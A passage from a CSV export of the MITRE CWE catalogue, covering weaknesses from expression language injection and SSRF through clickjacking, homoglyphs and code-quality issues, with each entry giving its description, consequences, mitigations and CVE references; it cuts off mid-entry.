commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Avoid adding user-controlled data into an expression interpreter when possible.::PHASE:Implementation:DESCRIPTION:If user-controlled data must be added to an expression interpreter, one or more of the following should be performed: Validate that the user input will not evaluate as an expression Encode the user input in a way that ensures it is not evaluated as an expression::PHASE:System Configuration Operation:DESCRIPTION:The framework or tooling might allow the developer to disable or deactivate the processing of EL expressions, such as setting the isELIgnored attribute for a JSP page to true.::\",\"::REFERENCE:CVE-2021-44228:DESCRIPTION:Product does not neutralize ${xyz} style expressions, allowing remote code execution. (log4shell vulnerability in log4j):LINK:https://www.cve.org/CVERecord?id=CVE-2021-44228::\",,,\"\",,\"::TYPE:Maintenance:NOTE:The interrelationships and differences between CWE-917 and CWE-1336 need to be further clarified.::TYPE:Relationship:NOTE:In certain versions of Spring 3.0.5 and earlier, there was a vulnerability (CVE-2011-2730) in which Expression Language tags would be evaluated twice, which effectively exposed any application to EL injection. However, even for later versions, this weakness is still possible depending on configuration.::\",\n918,\"Server-Side Request Forgery (SSRF)\",Base,Incomplete,\"The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.\",\"By providing URLs to unexpected hosts or ports, attackers can make it appear that the server is sending the request, possibly bypassing access controls such as firewalls that prevent the attackers from accessing the URLs directly. The server can be used as a proxy to conduct port scanning of hosts in internal networks, use other URLs such as that can access documents on the system (using file://), or use other protocols such as gopher:// or tftp://, which may provide greater control over the contents of requests.\",::NATURE:ChildOf:CWE ID:441:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:610:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY NAME:Web Server:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"::TERM:XSPA:DESCRIPTION:Cross Site Port Attack::\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data::SCOPE:Integrity:IMPACT:Execute Unauthorized Code or Commands::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"::REFERENCE:CVE-2021-26855:DESCRIPTION:Server Side Request Forgery (SSRF) in mail server, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-26855::REFERENCE:CVE-2021-21973:DESCRIPTION:Server Side Request Forgery in cloud platform, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-21973::REFERENCE:CVE-2016-4029:DESCRIPTION:Chain: incorrect validation of intended decimal-based IP address format (CWE-1286) enables parsing of octal or hexadecimal formats (CWE-1389), allowing bypass of an SSRF protection mechanism (CWE-918).:LINK:https://www.cve.org/CVERecord?id=CVE-2016-4029::REFERENCE:CVE-2002-1484:DESCRIPTION:Web server allows attackers to request a URL from another server, including other ports, which allows proxied scanning.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1484::REFERENCE:CVE-2004-2061:DESCRIPTION:CGI script accepts and retrieves incoming URLs.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2061::REFERENCE:CVE-2010-1637:DESCRIPTION:Web-based mail program allows internal network scanning using a modified POP3 port number.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-1637::REFERENCE:CVE-2009-0037:DESCRIPTION:URL-downloading library automatically follows redirects to file:// and scp:// URLs:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0037::\",,,\"\",::664::,\"::TYPE:Relationship:NOTE:CWE-918 (SSRF) and CWE-611 (XXE) are closely related, because they both involve web-related technologies and can launch outbound requests to unexpected destinations. However, XXE can be performed client-side, or in other contexts in which the software is not acting directly as a server, so the Server portion of the SSRF acronym does not necessarily apply.::\",\n920,\"Improper Restriction of Power Consumption\",Base,Incomplete,\"The product operates in an environment in which power is a limited resource that cannot be automatically replenished, but the product does not properly restrict the amount of power that its operation consumes.\",\"In environments such as embedded or mobile devices, power can be a limited resource such as a battery, which cannot be automatically replenished by the product itself, and the device might not always be directly attached to a reliable power source. If the product uses too much power too quickly, then this could cause the device (and subsequently, the product) to stop functioning until power is restored, or increase the financial burden on the device owner because of increased power costs. Normal operation of an application will consume power. However, in some cases, an attacker could cause the application to consume more power than intended, using components such as: Display CPU Disk I/O GPS Sound Microphone USB interface\",::NATURE:ChildOf:CWE ID:400:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:400:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Mobile:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Resource Consumption (Other):IMPACT:DoS: Crash, Exit, or Restart:NOTE:The power source could be drained, causing the application - and the entire device - to cease functioning.::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 6.2::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 6.2::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SD-4::\",,\"\",\n921,\"Storage of Sensitive Data in a Mechanism without Access Control\",Base,Incomplete,\"The product stores sensitive information in a file system or device that does not have built-in access control.\",\"While many modern file systems or devices utilize some form of access control in order to restrict access to data, not all storage mechanisms have this capability. For example, memory cards, floppy disks, CDs, and USB devices are typically made accessible to any user within the system. This can become a problem when sensitive data is stored in these mechanisms in a multi-user environment, because anybody on the system can read or write this data. On Android devices, external storage is typically globally readable and writable by other applications on the device. External storage may also be easily accessible through the mobile device's USB connection or physically accessible through the device's memory card port.\",::NATURE:ChildOf:CWE ID:922:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Mobile:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:IMPACT:Read Files or Directories:NOTE:Attackers can read sensitive information by accessing the unrestricted storage mechanism.::SCOPE:Integrity:IMPACT:Modify Application Data:IMPACT:Modify Files or Directories:NOTE:Attackers can modify or delete sensitive information by accessing the unrestricted storage mechanism.::\",\"\",\"\",\"\",,,\"\",,\"\",\n924,\"Improper Enforcement of Message Integrity During Transmission in a Communication Channel\",Base,Incomplete,\"The product establishes a communication channel with an endpoint and receives a message from that endpoint, but it does not sufficiently ensure that the message was not modified during transmission.\",\"Attackers might be able to modify the message and spoof the endpoint by interfering with the data as it crosses the network or by redirecting the connection to a system under their control.\",::NATURE:ChildOf:CWE ID:345:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:345:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:IMPACT:Gain Privileges or Assume Identity:NOTE:If an attackers can spoof the endpoint, the attacker gains all the privileges that were intended for the original endpoint.::\",\"\",\"\",\"\",,,\"\",,\"::TYPE:Maintenance:NOTE:This entry should be made more comprehensive in later CWE versions, as it is likely an important design flaw that underlies (or chains to) other weaknesses.::\",\n939,\"Improper Authorization in Handler for Custom URL Scheme\",Base,Incomplete,\"The product uses a handler for a custom URL scheme, but it does not properly restrict which actors can invoke the handler using the scheme.\",\"Mobile platforms and other architectures allow the use of custom URL schemes to facilitate communication between applications. In the case of iOS, this is the only method to do inter-application communication. The implementation is at the developer's discretion which may open security flaws in the application. An example could be potentially dangerous functionality such as modifying files through a custom URL scheme.\",::NATURE:ChildOf:CWE ID:862:VIEW ID:1000:ORDINAL:Primary::,\"\",::TECHNOLOGY CLASS:Mobile:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Utilize a user prompt pop-up to authorize potentially harmful actions such as those modifying data or dealing with sensitive information. When designing functionality of actions in the URL scheme, consider whether the action should be accessible to all mobile applications, or if an allowlist of applications to interface with is appropriate.::\",\"::REFERENCE:CVE-2013-5725:DESCRIPTION:URL scheme has action replace which requires no user prompt and allows remote attackers to perform undesired actions.:LINK:https://www.cve.org/CVERecord?id=CVE-2013-5725::REFERENCE:CVE-2013-5726:DESCRIPTION:URL scheme has action follow and favorite which allows remote attackers to force user to perform undesired actions.:LINK:https://www.cve.org/CVERecord?id=CVE-2013-5726::\",,,\"\",,\"\",\n940,\"Improper Verification of Source of a Communication Channel\",Base,Incomplete,\"The product establishes a communication channel to handle an incoming request that has been initiated by an actor, but it does not properly verify that the request is coming from the expected origin.\",\"When an attacker can successfully establish a communication channel from an untrusted origin, the attacker may be able to gain privileges and access unexpected functionality.\",::NATURE:ChildOf:CWE ID:923:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:346:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Mobile:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:SCOPE:Other:IMPACT:Gain Privileges or Assume Identity:IMPACT:Varies by Context:NOTE:An attacker can access any functionality that is inadvertently accessible to the source.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Use a mechanism that can validate the identity of the source, such as a certificate, and validate the integrity of data to ensure that it cannot be modified in transit using an Adversary-in-the-Middle (AITM) attack. When designing functionality of actions in the URL scheme, consider whether the action should be accessible to all mobile applications, or if an allowlist of applications to interface with is appropriate.::\",\"::REFERENCE:CVE-2000-1218:DESCRIPTION:DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1218::REFERENCE:CVE-2005-0877:DESCRIPTION:DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0877::REFERENCE:CVE-2001-1452:DESCRIPTION:DNS server caches glue records received from non-delegated name servers:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1452::\",,,\"\",::500::594::595::596::,\"::TYPE:Relationship:NOTE:While many access control issues involve authenticating the user, this weakness is more about authenticating the actual source of the communication channel itself; there might not be any user in such cases.::\",\n941,\"Incorrectly Specified Destination in a Communication Channel\",Base,Incomplete,\"The product creates a communication channel to initiate an outgoing request to an actor, but it does not correctly specify the intended destination for that actor.\",\"Attackers at the destination may be able to spoof trusted servers to steal data or cause a denial of service. There are at least two distinct weaknesses that can cause the product to communicate with an unintended destination: If the product allows an attacker to control which destination is specified, then the attacker can cause it to connect to an untrusted or malicious destination. For example, because UDP is a connectionless protocol, UDP packets can be spoofed by specifying a false source address in the packet; when the server receives the packet and sends a reply, it will specify a destination by using the source of the incoming packet - i.e., the false source. The server can then be tricked into sending traffic to the wrong host, which is effective for hiding the real source of an attack and for conducting a distributed denial of service (DDoS). As another example, server-side request forgery (SSRF) and XML External Entity (XXE) can be used to trick a server into making outgoing requests to hosts that cannot be directly accessed by the attacker due to firewall restrictions. If the product incorrectly specifies the destination, then an attacker who can control this destination might be able to spoof trusted servers. While the most common occurrence is likely due to misconfiguration by an administrator, this can be resultant from other weaknesses. For example, the product might incorrectly parse an e-mail or IP address and send sensitive data to an unintended destination. As another example, an Android application may use a sticky broadcast to communicate with a receiver for a particular application, but since sticky broadcasts can be processed by *any* receiver, this can allow a malicious application to access restricted data that was only intended for a different application.\",::NATURE:ChildOf:CWE ID:923:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:406:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Mobile:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"\",\"\",\"\",\"::REFERENCE:CVE-2013-5211:DESCRIPTION:composite: NTP feature generates large responses (high amplification factor) with spoofed UDP source addresses.:LINK:https://www.cve.org/CVERecord?id=CVE-2013-5211::REFERENCE:CVE-1999-0513:DESCRIPTION:Classic Smurf attack, using spoofed ICMP packets to broadcast addresses.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0513::REFERENCE:CVE-1999-1379:DESCRIPTION:DNS query with spoofed source address causes more traffic to be returned to spoofed address than was sent by the attacker.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1379::\",,,\"\",,\"\",\n1007,\"Insufficient Visual Distinction of Homoglyphs Presented to User\",Base,Incomplete,\"The product displays information or identifiers to a user, but the display mechanism does not make it easy for the user to distinguish between visually similar or identical glyphs (homoglyphs), which may cause the user to misinterpret a glyph and perform an unintended, insecure action.\",\"Some glyphs, pictures, or icons can be semantically distinct to a program, while appearing very similar or identical to a human user. These are referred to as homoglyphs. For example, the lowercase l (ell) and uppercase I (eye) have different character codes, but these characters can be displayed in exactly the same way to a user, depending on the font. This can also occur between different character sets. For example, the Latin capital letter A and the Greek capital letter Α (Alpha) are treated as distinct by programs, but may be displayed in exactly the same way to a user. Accent marks may also cause letters to appear very similar, such as the Latin capital letter grave mark À and its equivalent Á with the acute accent. Adversaries can exploit this visual similarity for attacks such as phishing, e.g. by providing a link to an attacker-controlled hostname that looks like a hostname that the victim trusts. In a different use of homoglyphs, an adversary may create a back door username that is visually similar to the username of a regular user, which then makes it more difficult for a system administrator to detect the malicious username while reviewing logs.\",::NATURE:ChildOf:CWE ID:451:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Web Based:TECHNOLOGY PREVALENCE:Sometimes::,\"\",\"::TERM:Homograph Attack:DESCRIPTION:Homograph is often used as a synonym of homoglyph by researchers, but according to Wikipedia, a homograph is a word that has multiple, distinct meanings.::\",\"::PHASE:Architecture and Design:NOTE:This weakness may occur when characters from various character sets are allowed to be interchanged within a URL, username, email address, etc. without any notification to the user or underlying system being used.::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:IMPACT:Other:NOTE:An attacker may ultimately redirect a user to a malicious website, by deceiving the user into believing the URL they are accessing is a trusted domain. However, the attack can also be used to forge log entries by using homoglyphs in usernames. Homoglyph manipulations are often the first step towards executing advanced attacks such as stealing a user's credentials, Cross-Site Scripting (XSS), or log forgery. If an attacker redirects a user to a malicious site, the attacker can mimic a trusted domain to steal account credentials and perform actions on behalf of the user, without the user's knowledge. Similarly, an attacker could create a username for a website that contains homoglyph characters, making it difficult for an admin to review logs and determine which users performed which actions.::\",\"::METHOD:Manual Dynamic Analysis:DESCRIPTION:If utilizing user accounts, attempt to submit a username that contains homoglyphs. Similarly, check to see if links containing homoglyphs can be sent via email, web browsers, or other mechanisms.:EFFECTIVENESS:Moderate::\",\"::PHASE:Implementation:DESCRIPTION:Use a browser that displays Punycode for IDNs in the URL and status bars, or which color code various scripts in URLs. Due to the prominence of homoglyph attacks, several browsers now help safeguard against this attack via the use of Punycode. For example, Mozilla Firefox and Google Chrome will display IDNs as Punycode if top-level domains do not restrict which characters can be used in domain names or if labels mix scripts for different languages.::PHASE:Implementation:DESCRIPTION:Use an email client that has strict filters and prevents messages that mix character sets to end up in a user's inbox. Certain email clients such as Google's GMail prevent the use of non-Latin characters in email addresses or in links contained within emails. This helps prevent homoglyph attacks by flagging these emails and redirecting them to a user's spam folder.::\",\"::REFERENCE:CVE-2013-7236:DESCRIPTION:web forum allows impersonation of users with homoglyphs in account names:LINK:https://www.cve.org/CVERecord?id=CVE-2013-7236::REFERENCE:CVE-2012-0584:DESCRIPTION:Improper character restriction in URLs in web browser:LINK:https://www.cve.org/CVERecord?id=CVE-2012-0584::REFERENCE:CVE-2009-0652:DESCRIPTION:Incomplete denylist does not include homoglyphs of / and ? characters in URLs:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0652::REFERENCE:CVE-2017-5015:DESCRIPTION:web browser does not convert hyphens to punycode, allowing IDN spoofing in URLs:LINK:https://www.cve.org/CVERecord?id=CVE-2017-5015::REFERENCE:CVE-2005-0233:DESCRIPTION:homoglyph spoofing using punycode in URLs and certificates:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0233::REFERENCE:CVE-2005-0234:DESCRIPTION:homoglyph spoofing using punycode in URLs and certificates:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0234::REFERENCE:CVE-2005-0235:DESCRIPTION:homoglyph spoofing using punycode in URLs and certificates:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0235::\",,,\"\",::632::,\"\",\n1021,\"Improper Restriction of Rendered UI Layers or Frames\",Base,Incomplete,\"The web application does not restrict or incorrectly restricts frame objects or UI layers that belong to another application or domain, which can lead to user confusion about which interface the user is interacting with.\",\"A web application is expected to place restrictions on whether it is allowed to be rendered within frames, iframes, objects, embed or applet elements. Without the restrictions, users can be tricked into interacting with the application when they were not intending to.\",::NATURE:ChildOf:CWE ID:441:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:610:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:451:VIEW ID:1000::,\"\",::TECHNOLOGY CLASS:Web Based:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"::TERM:Clickjacking::TERM:UI Redress Attack::TERM:Tapjacking:DESCRIPTION:Tapjacking is similar to clickjacking, except it is used for mobile applications in which the user taps the application instead of performing a mouse click.::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:IMPACT:Read Application Data:IMPACT:Modify Application Data:NOTE:An attacker can trick a user into performing actions that are masked and hidden from the user's view. The impact varies widely, depending on the functionality of the underlying application. For example, in a social media application, clickjacking could be used to trik the user into changing privacy settings.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:The use of X-Frame-Options allows developers of web content to restrict the usage of their application within the form of overlays, frames, or iFrames. The developer can indicate from which domains can frame the content. The concept of X-Frame-Options is well documented, but implementation of this protection mechanism is in development to cover gaps. There is a need for allowing frames from multiple domains.::PHASE:Implementation:DESCRIPTION:A developer can use a frame-breaker script in each page that should not be framed. This is very helpful for legacy browsers that do not support X-Frame-Options security feature previously mentioned. It is also important to note that this tactic has been circumvented or bypassed. Improper usage of frames can persist in the web application through nested frames. The frame-breaking script does not intuitively account for multiple nested frames that can be presented to the user.::PHASE:Implementation:DESCRIPTION:This defense-in-depth technique can be used to prevent the improper usage of frames in web applications. It prioritizes the valid sources of data to be loaded into the application through the usage of declarative policies. Based on which implementation of Content Security Policy is in use, the developer should use the frame-ancestors directive or the frame-src directive to mitigate this weakness. Both directives allow for the placement of restrictions when it comes to allowing embedded content.::\",\"::REFERENCE:CVE-2017-7440:DESCRIPTION:E-mail preview feature in a desktop application allows clickjacking attacks via a crafted e-mail message:LINK:https://www.cve.org/CVERecord?id=CVE-2017-7440::REFERENCE:CVE-2017-5697:DESCRIPTION:Hardware/firmware product has insufficient clickjacking protection in its web user interface:LINK:https://www.cve.org/CVERecord?id=CVE-2017-5697::REFERENCE:CVE-2017-4015:DESCRIPTION:Clickjacking in data-loss prevention product via HTTP response header.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-4015::REFERENCE:CVE-2016-2496:DESCRIPTION:Tapjacking in permission dialog for mobile OS allows access of private storage using a partially-overlapping window.:LINK:https://www.cve.org/CVERecord?id=CVE-2016-2496::REFERENCE:CVE-2015-1241:DESCRIPTION:Tapjacking in web browser related to page navigation and touch/gesture events.:LINK:https://www.cve.org/CVERecord?id=CVE-2015-1241::REFERENCE:CVE-2017-0492:DESCRIPTION:System UI in mobile OS allows a malicious application to create a UI overlay of the entire screen to gain privileges.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-0492::\",,,\"\",::103::181::222::504::506::587::654::,\"\",\n1024,\"Comparison of Incompatible Types\",Base,Incomplete,\"The product performs a comparison between two entities, but the entities are of different, incompatible types that cannot be guaranteed to provide correct results when they are directly compared.\",\"In languages that are strictly typed but support casting/conversion, such as C or C++, the programmer might assume that casting one entity to the same type as another entity will ensure that the comparison will be performed correctly, but this cannot be guaranteed. In languages that are not strictly typed, such as PHP or JavaScript, there may be implicit casting/conversion to a type that the programmer is unaware of, causing unexpected results; for example, the string 123 might be converted to a number type. See examples.\",::NATURE:ChildOf:CWE ID:697:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:JavaScript:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:PHP:LANGUAGE PREVALENCE:Undetermined::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context::\",\"\",\"::PHASE:Testing:DESCRIPTION:Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing.::\",\"\",,,\"\",,\"\",\n1025,\"Comparison Using Wrong Factors\",Base,Incomplete,\"The code performs a comparison between two entities, but the comparison examines the wrong factors or characteristics of the entities, which can lead to incorrect results and resultant weaknesses.\",\"This can lead to incorrect results and resultant weaknesses. For example, the code might inadvertently compare references to objects, instead of the relevant contents of those objects, causing two equal objects to be considered unequal.\",::NATURE:ChildOf:CWE ID:697:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context::\",\"\",\"::PHASE:Testing:DESCRIPTION:Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing.::\",\"\",,,\"\",,\"\",\n1037,\"Processor Optimization Removal or Modification of Security-critical Code\",Base,Incomplete,\"The developer builds a security-critical protection mechanism into the software, but the processor optimizes the execution of the program such that the mechanism is removed or modified.\",\"\",::NATURE:ChildOf:CWE ID:1038:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary:DESCRIPTION:This weakness does not depend on other weaknesses and is the result of choices made by the processor in executing the specified application.::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Rarely::TECHNOLOGY NAME:Processor Hardware:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Optimizations built into the design of the processor can have unintended consequences during the execution of an application.::\",\"\",,\"::SCOPE:Integrity:IMPACT:Bypass Protection Mechanism:LIKELIHOOD:High:NOTE:A successful exploitation of this weakness will change the order of an application's execution and will likely be used to bypass specific protection mechanisms. This bypass can be exploited further to potentially read data that should otherwise be unaccessible.::\",\"::METHOD:White Box:DESCRIPTION:In theory this weakness can be detected through the use of white box testing techniques where specifically crafted test cases are used in conjunction with debuggers to verify the order of statements being executed.:EFFECTIVENESS:Opportunistic::\",\"\",\"::REFERENCE:CVE-2017-5715:DESCRIPTION:Intel, ARM, and AMD processor optimizations related to speculative execution and branch prediction cause access control checks to be bypassed when placing data into the cache. Often known as Spectre.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-5715::REFERENCE:CVE-2017-5753:DESCRIPTION:Intel, ARM, and AMD processor optimizations related to speculative execution and branch prediction cause access control checks to be bypassed when placing data into the cache. Often known as Spectre.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-5753::REFERENCE:CVE-2017-5754:DESCRIPTION:Intel processor optimizations related to speculative execution cause access control checks to be bypassed when placing data into the cache. Often known as Meltdown.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-5754::\",,,\"\",::663::,\"::TYPE:Maintenance:NOTE:As of CWE 4.9, members of the CWE Hardware SIG are closely analyzing this entry and others to improve CWE's coverage of transient execution weaknesses, which include issues related to Spectre, Meltdown, and other attacks. Additional investigation may include other weaknesses related to microarchitectural state. As a result, this entry might change significantly in CWE 4.10.::\",\n1041,\"Use of Redundant Code\",Base,Incomplete,\"The product has multiple functions, methods, procedures, macros, etc. that contain the same code.\",\"This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. For example, if there are two copies of the same code, the programmer might fix a weakness in one copy while forgetting to fix the same weakness in another copy.\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Merge common functionality into a single function and then call that function from across the entire code base.::\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-19::\",,\"\",\n1043,\"Data Element Aggregating an Excessively Large Number of Non-Primitive Elements\",Base,Incomplete,\"The product uses a data element that has an excessively large number of sub-elements with non-primitive data types such as structures or aggregated objects.\",\"This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability. While the interpretation of excessively large may vary for each product or developer, CISQ recommends a default of 5 sub-elements.\",::NATURE:ChildOf:CWE ID:1093:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Performance::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCPEM:ENTRY ID:ASCPEM-PRF-12::\",,\"\",\n1044,\"Architecture with Number of Horizontal Layers Outside of Expected Range\",Base,Incomplete,\"The product's architecture contains too many - or too few - horizontal layers.\",\"This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities. While the interpretation of expected range may vary for each product or developer, CISQ recommends a default minimum of 4 layers and maximum of 8 layers.\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"::PHASE:Architecture and Design::\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-9::\",,\"\",\n1045,\"Parent Class with a Virtual Destructor and a Child Class without a Virtual Destructor\",Base,Incomplete,\"A parent class has a virtual destructor method, but the parent has a child class that does not have a virtual destructor.\",\"This issue can prevent the product from running reliably, since the child might not perform essential destruction operations. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability, such as a memory leak (CWE-401).\",::NATURE:ChildOf:CWE ID:1076:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Reliability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-RLB-17::\",,\"\",\n1046,\"Creation of Immutable Text Using String Concatenation\",Base,Incomplete,\"The product creates an immutable text string using string concatenation operations.\",\"When building a string via a looping feature (e.g., a FOR or WHILE loop), the use of += to append to the existing string will result in the creation of a new object with each iteration. This programming pattern can be inefficient in comparison with use of text buffer data elements. This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this could be influenced to create performance problem.\",::NATURE:ChildOf:CWE ID:1176:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Performance::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCPEM:ENTRY ID:ASCPEM-PRF-2::\",,\"\",\n1047,\"Modules with Circular Dependencies\",Base,Incomplete,\"The product contains modules in which one module has references that cycle back to itself, i.e., there are circular dependencies.\",\"As an example, with Java, this weakness might indicate cycles between packages. This issue makes it more difficult to maintain the product due to insufficient modularity, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities. This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a 